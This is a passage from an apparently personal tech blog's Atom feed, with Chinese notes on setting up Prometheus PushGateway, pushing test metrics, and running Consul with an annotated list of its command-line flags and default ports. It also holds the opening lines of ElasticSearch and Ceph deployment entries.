Prometheus &#x751F;&#x6001;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x4E00;&#x5458;&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x4EFB;&#x4F55;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x5176; Push &#x7B26;&#x5408;&#x89C4;&#x8303;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x76D1;&#x63A7;&#x6307;&#x6807;&#xFF0C;&#x5728;&#x7ED3;&#x5408; Prometheus &#x7EDF;&#x4E00;&#x6536;&#x96C6;&#x76D1;&#x63A7;&#x3002;<br>PushGateway &#x4F7F;&#x7528;&#x573A;&#x666F;&#xFF1A;  </p><ul><li>Prometheus &#x91C7;&#x7528;&#x5B9A;&#x65F6; Pull &#x6A21;&#x5F0F;&#xFF0C;&#x53EF;&#x80FD;&#x7531;&#x4E8E;&#x5B50;&#x7F51;&#x7EDC;&#x6216;&#x8005;&#x9632;&#x706B;&#x5899;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x62C9;&#x53D6;&#x5404;&#x4E2A; Target &#x7684;&#x6307;&#x6807;&#x6570;&#x636E;&#xFF0C;&#x6B64;&#x65F6;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x5404;&#x4E2A; Target &#x5F80; PushGateway &#x4E0A; Push &#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E; Prometheus &#x53BB; PushGateway &#x4E0A;&#x5B9A;&#x65F6; pull&#x3002;</li><li>&#x5176;&#x6B21;&#x5728;&#x76D1;&#x63A7;&#x5404;&#x4E2A;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x5404;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x6C47;&#x603B;&#xFF0C;&#x6B64;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x91C7;&#x7528; PushGateway &#x6765;&#x7EDF;&#x4E00;&#x6536;&#x96C6;&#xFF0C;&#x7136;&#x540E; Prometheus &#x6765;&#x7EDF;&#x4E00;&#x62C9;&#x53D6;&#x3002;</li></ul></blockquote><p><strong>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;PushGateway</strong></p><pre><code class="bash">curl -O --progress http://192.168.210.200/0221-note/pushgateway-1.4.3.linux-amd64.tar.gztar -zxf pushgateway-1.4.3.linux-amd64.tar.gz -C /opt/cd /opt/pushgateway-1.4.3.linux-amd64/</code></pre><p><strong>&#x5728;Prometheus&#x914D;&#x7F6E;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#xFF1A;</strong>  </p><pre><code class="yaml">  - job_name: &apos;pushgateway&apos;    static_configs:    - targets: [&apos;192.168.73.12:9091&apos;]</code></pre><p>&#x91CD;&#x542F;Prometheus</p><p><strong>&#x542F;&#x52A8;PushGateway</strong></p><pre><code class="bash">./pushgateway</code></pre><p><strong>&#x63A8;&#x9001;&#x6570;&#x636E;&#x6D4B;&#x8BD5;&#xFF1A;</strong></p><pre><code class="bash">echo &quot;mytest_metric 2022&quot; | curl --data-binary @- http://192.168.73.12:9091/metrics/job/mytest_jobecho &quot;mytest_metric 0628&quot; | curl --data-binary @- http://192.168.73.12:9091/metrics/job/mytest_job# &#x63A8;&#x9001;&#x591A;&#x6761;&#x6570;&#x636E;cat &lt;&lt;EOF | curl --data-binary @- http://192.168.73.12:9091/metrics/job/test_job/instance/192.168.73.12#TYPE node_memory_usage gaugenode_memory_usage 4311744512# TYPE memory_total gaugenode_memory_total 103481868288EOF</code></pre><p>&#x8BBF;&#x95EE;pushgatway&#x7684;&#x4E3B;&#x673A;&#x67E5;&#x770B;&#x6570;&#x636E;&#x662F;&#x5426;&#x63A8;&#x9001;&#x6210;&#x529F;&#xFF1A;<br><a href="http://192.168.73.12:9091/" target="_blank" rel="noopener">http://192.168.73.12:9091/</a></p><hr><h2 id="&#x6269;&#x5C55;&#x77E5;&#x8BC6;&#x2014;&#x2014;Consul&#x7684;&#x4F7F;&#x7528;"><a href="#&#x6269;&#x5C55;&#x77E5;&#x8BC6;&#x2014;&#x2014;Consul&#x7684;&#x4F7F;&#x7528;" class="headerlink" title="&#x6269;&#x5C55;&#x77E5;&#x8BC6;&#x2014;&#x2014;Consul&#x7684;&#x4F7F;&#x7528;"></a>&#x6269;&#x5C55;&#x77E5;&#x8BC6;&#x2014;&#x2014;Consul&#x7684;&#x4F7F;&#x7528;</h2><blockquote><p>&#x670D;&#x52A1;&#x7AEF;<br>consul agent -server -bootstrap-expect 1 -config-dir /etc/consul.d/ -data-dir /var/opt/consul -bind=125.72.214.83 &gt;&gt; /var/opt/consul/consul.log 2&gt;&amp;1<br>&#x6CE8;&#x518C;&#x670D;&#x52A1;<br>curl -X PUT -d &#x2018;{&#x201C;type&#x201D;:&#x201D;localService&#x201D;,&#x201D;outPort&#x201D;:8085,&#x201D;outPath&#x201D;:&#x201D;/websocket&#x201D;, &#x201C;forwardAddress&#x201D;:&#x201D;125.72.2&#xB7;4.83&#x201D;, &#x201C;forwardPort&#x201D;:&#x201D;8085&#x201D;}&#x2019; <a href="http://localhost:8500/v1/kv/websocket/my" target="_blank" rel="noopener">http://localhost:8500/v1/kv/websocket/my</a><br>webui&#x6DFB;&#x52A0;<br>-client 0.0.0.0 -ui<br>&#x5BA2;&#x6237;&#x7AEF;<br>consul agent -config-dir /etc/consul.d/ -data-dir /var/opt/consul -bind=121.42.204.73 -join=121.42.204.73 &gt;consul.log 2&gt;&amp;1<br>-bootstrap&#xFF1A;&#x542F;&#x52A8;&#x6A21;&#x5F0F;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x8282;&#x70B9;&#x53EF;&#x4EE5;&#x9009;&#x4E3E;&#x81EA;&#x5DF1;&#x4E3A;leader&#xFF0C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x6B64;&#x6A21;&#x5F0F;&#x542F;&#x52A8;&#x7684;&#x8282;&#x70B9;&#x3002;&#x673A;&#x7FA4;&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x65B0;&#x542F;&#x52A8;&#x7684;&#x8282;&#x70B9;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x3002;<br>-bootstrap-expect&#xFF1A;&#x8BBE;&#x5B9A;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x9700;&#x8981;&#x7684;&#x670D;&#x52A1;&#x8282;&#x70B9;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x8BBE;&#x7F6E;&#xFF0C;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x5B57;&#x5FC5;&#x987B;&#x548C;&#x5B9E;&#x9645;&#x7684;&#x670D;&#x52A1;&#x8282;&#x70B9;&#x6570;&#x5339;&#x914D;&#x3002;consul&#x4F1A;&#x7B49;&#x5F85;&#x76F4;&#x5230;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x4E0B;&#x7684;&#x670D;&#x52A1;&#x8282;&#x70B9;&#x6EE1;&#x8DB3;&#x8BBE;&#x5B9A;&#x624D;&#x4F1A;&#x542F;&#x52A8;&#x96C6;&#x7FA4;&#x670D;&#x52A1;&#x3002;&#x521D;&#x59CB;&#x5316;leader&#x9009;&#x4E3E;&#xFF0C;&#x4E0D;&#x80FD;&#x548C;bootstrap&#x6DF7;&#x7528;&#x3002;&#x5FC5;&#x987B;&#x914D;&#x5408;-server&#x914D;&#x7F6E;&#x3002;<br>-bind&#xFF1A;&#x7ED1;&#x5B9A;&#x7684;&#x5185;&#x90E8;&#x901A;&#x8BAF;&#x5730;&#x5740;&#xFF0C;&#x9ED8;&#x8BA4;0.0.0.0&#xFF0C;&#x5373;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x672C;&#x5730;&#x5730;&#x5740;&#xFF0C;&#x4F1A;&#x5C06;&#x7B2C;&#x4E00;&#x4E2A;&#x53EF;&#x7528;&#x7684;ip&#x5730;&#x5740;&#x6563;&#x64AD;&#x5230;&#x96C6;&#x7FA4;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x591A;&#x4E2A;&#x53EF;&#x7528;&#x7684;ipv4&#xFF0C;&#x5219;consul&#x542F;&#x52A8;&#x62A5;&#x9519;&#x3002;[::]ipv6&#xFF0C;TCP UDP&#x534F;&#x8BAE;&#xFF0C;&#x76F8;&#x540C;&#x7684;&#x7AEF;&#x53E3;&#x3002;&#x9632;&#x706B;&#x5899;&#x914D;&#x7F6E;&#x3002;<br>-client&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x6A21;&#x5F0F;&#xFF0C;http dns&#xFF0C;&#x9ED8;&#x8BA4;127.0.0.1&#xFF0C;&#x56DE;&#x73AF;&#x4EE4;&#x724C;&#x7F51;&#x5740;<br>-config-file&#xFF1A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;<br>-config-dir&#xFF1A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x4F1A;&#x52A0;&#x8F7D;&#x5176;&#x4E0B;&#x6240;&#x6709;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;.json&#x6216;&#x8005;.hcl&#x6587;&#x4EF6;&#xFF0C;&#x52A0;&#x8F7D;&#x987A;&#x5E8F;&#x4E3A;&#x5B57;&#x6BCD;&#x8868;&#x987A;&#x5E8F;&#xFF1B;&#x53EF;&#x7528;&#x914D;&#x7F6E;&#x591A;&#x4E2A;&#x6B64;&#x914D;&#x7F6E;&#xFF0C;&#x4ECE;&#x800C;&#x52A0;&#x8F7D;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x5B50;&#x6587;&#x4EF6;&#x5939;&#x7684;&#x914D;&#x7F6E;&#x4E0D;&#x4F1A;&#x88AB;&#x52A0;&#x8F7D;&#x3002;<br>-config-format&#xFF1A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF0C;&#x914D;&#x7F6E;&#x4E86;&#xFF0C;&#x5219;&#x52A0;&#x8F7D;&#x76F8;&#x5E94;&#x4E2A;&#x662F;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x4E0D;&#x914D;&#x7F6E;&#xFF0C;&#x5219;consul&#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x3002;<br>-data-dir&#xFF1A;&#x72B6;&#x6001;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x8282;&#x70B9;&#x90FD;&#x9700;&#x8981;&#x3002;&#x6587;&#x4EF6;&#x5939;&#x4F4D;&#x7F6E;&#x9700;&#x8981;&#x4E0D;&#x6536;consul&#x8282;&#x70B9;&#x91CD;&#x542F;&#x5F71;&#x54CD;&#xFF0C;&#x5FC5;&#x987B;&#x80FD;&#x591F;&#x4F7F;&#x7528;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6587;&#x4EF6;&#x9501;&#xFF0C;unix-based&#x7CFB;&#x7EDF;&#x4E0B;&#xFF0C;&#x6587;&#x4EF6;&#x5939;&#x6587;&#x4EF6;&#x6743;&#x9650;&#x4E3A;0600&#xFF0C;&#x6CE8;&#x610F;&#x505A;&#x597D;&#x8D26;&#x6237;&#x6743;&#x9650;&#x63A7;&#x5236;&#xFF0C;<br>-datacenter&#xFF1A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x540D;&#x79F0;&#xFF0C;&#x9ED8;&#x8BA4;dc1&#xFF0C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x7684;&#x6240;&#x6709;&#x8282;&#x70B9;&#x90FD;&#x5FC5;&#x987B;&#x5728;&#x4E00;&#x4E2A;LAN&#x4E2D;&#x3002;<br>-dev&#xFF1A;&#x5F00;&#x53D1;&#x6A21;&#x5F0F;&#xFF0C;&#x53BB;&#x6389;&#x6240;&#x6709;&#x6301;&#x4E45;&#x5316;&#x9009;&#x9879;&#xFF0C;&#x5185;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x6A21;&#x5F0F;&#x3002;<br>-disable-host-node-id&#xFF1A;&#x4E0D;&#x4F7F;&#x7528;host&#x4FE1;&#x606F;&#x751F;&#x6210;node ID&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x540C;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x90E8;&#x7F72;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x968F;&#x673A;&#x751F;&#x6210;nodeID<br>-dns-port&#xFF1A;v7.0&#x4EE5;&#x540E;&#xFF0C;&#x81EA;&#x5B9A;&#x4E49;dns &#x7AEF;&#x53E3;&#xFF0C;&#x8986;&#x76D6;&#x9ED8;&#x8BA4;8600<br>-enable-script-checks&#xFF1A;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x5065;&#x5EB7;&#x68C0;&#x67E5;&#xFF0C;&#x9ED8;&#x8BA4;false&#xFF0C;&#x6700;&#x597D;&#x914D;&#x7F6E;enable acl<br>-encrypt&#xFF1A;consul&#x7F51;&#x7EDC;&#x901A;&#x8BAF;&#x52A0;&#x5BC6;key&#xFF0C;base64&#x52A0;&#x5BC6;&#xFF0C;16&#x6BD4;&#x7279;&#xFF1B;consul keygen&#x4EA7;&#x751F;&#x3002;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x5B9E;&#x4F8B;&#x5FC5;&#x987B;&#x63D0;&#x4F9B;&#x76F8;&#x540C;&#x7684;&#xFF0C;&#x53EA;&#x9700;&#x63D0;&#x4F9B;&#x4E00;&#x6B21;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x4FDD;&#x5B58;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x3002;&#x91CD;&#x542F;&#x81EA;&#x52A8;&#x52A0;&#x8F7D;&#x3002;consul&#x8282;&#x70B9;&#x542F;&#x52A8;&#x540E;&#x63D0;&#x4F9B;&#xFF0C;&#x4F1A;&#x88AB;&#x5FFD;&#x7565;&#x3002;<br>-hcl&#xFF1A;&#x6DFB;&#x52A0;hcl&#x683C;&#x5F0F;&#x914D;&#x7F6E;&#xFF0C;&#x548C;&#x5DF2;&#x6709;&#x7684;&#x914D;&#x7F6E;&#x5408;&#x5E76;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x591A;&#x4E2A;&#x6B64;&#x914D;&#x7F6E;&#x3002;<br>-http-port&#xFF1A;http api&#x7AEF;&#x53E3;&#xFF0C;&#x8986;&#x76D6;&#x9ED8;&#x8BA4;&#x7684;8500&#x3002;&#x9002;&#x7528;&#x4E8E;&#x4E91;&#x73AF;&#x5883;&#x6307;&#x5B9A;&#x3002;<br>-log-file&#xFF1A;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x63D0;&#x4F9B;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;Consul-&#x65F6;&#x95F4;&#x6233;.log<br>-log-level&#xFF1A;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;&#xFF0C;&#x9ED8;&#x8BA4;info&#xFF0C;&#x5305;&#x542B;&#xFF1A;trace&#xFF0C;debug&#xFF0C;info&#xFF0C;warn&#xFF0C;err&#xFF1B;consul monitor&#x76D1;&#x63A7;<br>-log-rotate-bytes&#xFF1A;&#x65B0;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x751F;&#x6210;&#x5927;&#x5C0F;&#x9608;&#x503C;&#x3002;<br>-log-rotate-rotation&#xFF1A;&#x65B0;&#x65E5;&#x5FD7;&#x751F;&#x6210;&#x65F6;&#x95F4;&#x9608;&#x503C;<br>-join&#xFF1A;&#x9700;&#x8981;&#x52A0;&#x5165;&#x7684;&#x5176;&#x5B83;&#x8282;&#x70B9;&#x5730;&#x5740;&#xFF0C;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x4F7F;&#x7528;&#xFF0C;&#x52A0;&#x5165;&#x591A;&#x4E2A;&#x8282;&#x70B9;&#x3002;<br>-retry-join&#xFF1A;&#x4F1A;&#x8FDB;&#x884C;&#x52A0;&#x5165;&#x91CD;&#x8BD5;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x8BA4;&#x5B9A;&#x52A0;&#x5165;&#x8282;&#x70B9;&#x6700;&#x7EC8;&#x4F1A;&#x6B63;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x3002;ipv4&#xFF0C;ipv6&#xFF0C;dns<br>-retry-interval&#xFF1A;&#x4E0A;&#x8FF0;&#xFF0C;&#x91CD;&#x8BD5;&#x95F4;&#x9694;&#xFF0C;&#x9ED8;&#x8BA4;30s<br>-retry-max&#xFF1A;&#x91CD;&#x8BD5;&#x6B21;&#x6570;&#xFF0C;&#x9ED8;&#x8BA4;0&#xFF0C;&#x65E0;&#x9650;&#x6B21;&#x91CD;&#x8BD5;<br>-join-wan&#xFF0C; -retry-join-wan&#xFF0C; -retry-interval-wan&#xFF0C; -retry-max-wan<br>-node&#xFF1A;&#x8282;&#x70B9;&#x540D;&#x79F0;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3B;&#x673A;&#x540D;<br>-node-id&#xFF1A;&#x8282;&#x70B9;ID&#xFF0C;<br>-pid-file&#xFF1A;consul &#x5B58;&#x50A8; pid &#x7684;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#xFF0C;&#x7528;&#x4E8E;&#x4E3B;&#x52A8;&#x53D1;&#x4FE1;&#x53F7;&#x3002;&#x5982;&#x505C;&#x6B62;&#x8282;&#x70B9;&#xFF0C;&#x91CD;&#x8F7D;&#x914D;&#x7F6E;&#x7B49;&#x3002;<br>-protocol&#xFF1A;&#x4F7F;&#x7528;&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x5347;&#x7EA7;&#x65F6;&#x4F7F;&#x7528;&#x3002;consul -v&#x67E5;&#x770B;&#x534F;&#x8BAE;&#x7248;&#x672C;<br>-raft-protocol&#xFF1A;&#x4F7F;&#x7528;raft&#x534F;&#x8BAE;&#x7248;&#x672C;&#xFF0C;&#x9ED8;&#x8BA4;3<br>-raft-snapshot-threshold&#xFF1A;raft&#x6267;&#x884C;&#x5FEB;&#x7167;&#xFF0C;&#x63D0;&#x4EA4;&#x6B21;&#x6570;&#x9608;&#x503C;&#x3002;&#x4E00;&#x822C;&#x4E0D;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#xFF0C;io&#x5BC6;&#x96C6;&#x578B;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x8C03;&#x9AD8;&#x3002;&#x907F;&#x514D;&#x6240;&#x6709;&#x7684;&#x8282;&#x70B9;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x5FEB;&#x7167;&#x3002;&#x6B64;&#x503C;&#x8FC7;&#x5927;&#xFF0C;&#x4F1A;&#x9020;&#x6210;&#x76F8;&#x5E94;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x53D8;&#x5927;&#xFF0C;&#x8282;&#x70B9;&#x91CD;&#x542F;&#x6062;&#x590D;&#x4F1A;&#x8017;&#x8D39;&#x66F4;&#x957F;&#x65F6;&#x95F4;&#x3002;1.1.0&#x540E;&#xFF0C;&#x9ED8;&#x8BA4;16384&#xFF0C;&#x4E4B;&#x524D;8192.<br>-raft-snapshot-interval&#xFF1A;&#x6267;&#x884C;&#x5FEB;&#x7167;&#x95F4;&#x9694;&#xFF0C;&#x5F71;&#x54CD;&#x7C7B;&#x4F3C;&#x4E0A;&#x4E2A;&#x914D;&#x7F6E;&#xFF0C;1.1.0&#x540E;&#x9ED8;&#x8BA4;30s&#xFF0C;&#x4E4B;&#x524D;5s&#x3002;<br>-rejoin&#xFF1A;&#x8282;&#x70B9;&#x4F1A;&#x5C1D;&#x8BD5;&#x91CD;&#x65B0;&#x52A0;&#x5165;&#x96C6;&#x7FA4;&#x3002;<br>-server&#xFF1A;&#x670D;&#x52A1;&#x7AEF;&#x8282;&#x70B9;&#x6A21;&#x5F0F;&#x3002;<br>-server-port&#xFF1A;&#x670D;&#x52A1;&#x7AEF;RPC&#x7AEF;&#x53E3;&#xFF0C;v1.2.2&#x540E;&#x63D0;&#x4F9B;&#x3002;<br>-non-voting-server&#xFF1A;&#x670D;&#x52A1;&#x8282;&#x70B9;&#x4E0D;&#x53C2;&#x4E0E;&#x9009;&#x4E3E;&#xFF0C;&#x63A5;&#x53D7;&#x65E5;&#x5FD7;&#x590D;&#x5236;&#xFF0C;&#x7528;&#x4E8E;&#x6A2A;&#x5411;&#x6269;&#x5C55;&#xFF0C;&#x670D;&#x52A1;&#x67E5;&#x8BE2;&#x8BF7;&#x6C42;&#x3002;&#xFF08;&#x7C7B;&#x6BD4;zookeeper &#x89C2;&#x5BDF;&#x8005;&#x8282;&#x70B9;&#xFF09;<br>-syslog&#xFF1A;linux OSX&#x7CFB;&#x7EDF;&#xFF0C;&#x914D;&#x7F6E;&#x65E5;&#x5FD7;&#x8F93;&#x51FA;&#x5230;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x3002;<br>-ui&#xFF1A;&#x5185;&#x7F6E;web ui&#x754C;&#x9762;&#x3002;<br>-ui-dir&#xFF1A;web ui &#x8D44;&#x6E90;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x4F7F;&#x7528;&#x6B64;&#x914D;&#x7F6E;&#xFF0C;&#x5219;&#x4E0D;&#x9700;&#x4E5F;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x518D;-ui&#x914D;&#x7F6E;&#x3002;  </p></blockquote><p><strong>&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x7AEF;&#x53E3;&#xFF1A;</strong><br>&#x670D;&#x52A1;&#x7AEF;RPC&#xFF1A;&#x9ED8;&#x8BA4;8300&#xFF0C;TCP&#x3002;<br>Serl LAN&#xFF1A;&#x5904;&#x7406;LAN gossip&#xFF0C;&#x9ED8;&#x8BA4;8301&#xFF0C;TCP UDP&#x3002;<br>Serl WAN&#xFF1A;&#x5904;&#x7406;LAN gossip&#xFF0C;&#x9ED8;&#x8BA4;8302&#xFF0C;TCP UDP&#x3002;<br>HTTP API&#xFF1A;8500&#xFF0C;TCP.<br>DNS&#xFF1A;8600&#xFF0C;TCP,UDP.  </p><p><strong>&#x53EF;&#x91CD;&#x8F7D;&#x914D;&#x7F6E;&#xFF1A;</strong><br>Log level<br>Checks<br>Services<br>Watches<br>HTTP Client Address<br>Node Metadata<br>Metric Prefix Filter<br>Discard Check Output<br>RPC rate limiting  </p><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p>Prometheus&#x624B;&#x518C;(&#x4E0E;Consul&#x96C6;&#x6210;&#xFF09;&#xFF1A;<a href="https://yunlzheng.gitbook.io/prometheus-book/part-ii-prometheus-jin-jie/sd/service-discovery-with-consul" target="_blank" rel="noopener">https://yunlzheng.gitbook.io/prometheus-book/part-ii-prometheus-jin-jie/sd/service-discovery-with-consul</a></p><p>Consul&#x547D;&#x4EE4;&#x884C;&#x6700;&#x5168;&#x6587;&#x6863;&#xFF1A;<a href="https://juejin.cn/post/6844903862034235399" target="_blank" rel="noopener">https://juejin.cn/post/6844903862034235399</a></p><p>Consul&#x542F;&#x52A8;&#x547D;&#x4EE4;&#xFF1A;<a href="https://www.cnblogs.com/niejunlei/p/5982911.html" target="_blank" rel="noopener">https://www.cnblogs.com/niejunlei/p/5982911.html</a></p><p>Nginx&#x865A;&#x62DF;&#x4E3B;&#x673A;&#x6D41;&#x91CF;&#x72B6;&#x6001;&#x6A21;&#x5757;&#xFF08;nginx-module-vts&#xFF09;&#x4F7F;&#x7528;&#x8BF4;&#x660E;&#x6587;&#x6863;&#xFF1A;<a href="http://tobrainto.com/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84/nginx-module-vts-all/" target="_blank" rel="noopener">http://tobrainto.com/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84/nginx-module-vts-all/</a></p><p>Prometheus&#x76D1;&#x63A7;Nginx <a href="https://www.modb.pro/db/28470" target="_blank" rel="noopener">https://www.modb.pro/db/28470</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;二进制安装&quot;&gt;&lt;a href=&quot;#二进制安装&quot; class=&quot;headerlink&quot; title=&quot;二进制安装&quot;&gt;&lt;/a&gt;二进制安装&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Download Prometheus Binary Pakcage&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;curl -O --progress http://192.168.210.200/0221-note/prometheus-2.36.2.linux-amd64.tar.gz
tar zxvf prometheus-2.36.2.linux-amd64.tar.gz -C /opt/
mv prometheus-2.36.2.linux-amd64/ prometheus-2.36.2
cd /opt/prometheus-2.36.2/
vim /etc/systemd/system/prometheus.service
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ElasticSearch环境搭建</title>
    <link href="https://marnm.github.io//posts/2d95f1c1/"/>
    <id>https://marnm.github.io//posts/2d95f1c1/</id>
    <published>2022-06-15T06:41:28.000Z</published>
    <updated>2022-06-28T09:21:19.846Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ceph分布式存储部署笔记</title>
    <link href="https://marnm.github.io//posts/38843421/"/>
    <id>https://marnm.github.io//posts/38843421/</id>
    <published>2022-06-12T13:09:47.000Z</published>
    <updated>2022-09-02T19:11:25.001Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x6982;&#x5FF5;"><a href="#&#x6982;&#x5FF5;" class="headerlink" title="&#x6982;&#x5FF5;"></a>&#x6982;&#x5FF5;</h2><h3 id="&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x76F8;&#x5173;"><a href="#&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x76F8;&#x5173;" class="headerlink" title="&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x76F8;&#x5173;"></a>&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x76F8;&#x5173;</h3><p>&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x662F;&#x4E00;&#x79CD;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x6280;&#x672F;&#xFF0C;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x4F7F;&#x7528;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E9B;&#x5206;&#x6563;&#x7684;&#x5B58;&#x50A8;&#x8D44;&#x6E90;&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x865A;&#x62DF;&#x7684;&#x5B58;&#x50A8;&#x8BBE;&#x5907;&#xFF0C;&#x6570;&#x636E;&#x5206;&#x6563;&#x7684;&#x5B58;&#x50A8;&#x5728;&#x4F01;&#x4E1A;&#x7684;&#x5404;&#x4E2A;&#x89D2;&#x843D;&#x3002;</p><h3 id="Ceph&#x76F8;&#x5173;"><a href="#Ceph&#x76F8;&#x5173;" class="headerlink" 